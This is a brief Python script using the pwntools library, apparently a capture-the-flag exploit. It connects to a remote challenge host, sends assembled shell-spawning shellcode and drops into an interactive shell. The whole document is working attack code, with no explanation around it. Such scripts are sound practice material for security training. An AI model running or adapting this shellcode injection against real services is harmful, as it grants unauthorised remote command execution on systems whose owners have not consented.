#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

r = remote('ctf.adl.tw',  10002)
payload = asm(shellcraft.sh())
r.sendline(payload)

r.interactive()
r.close()
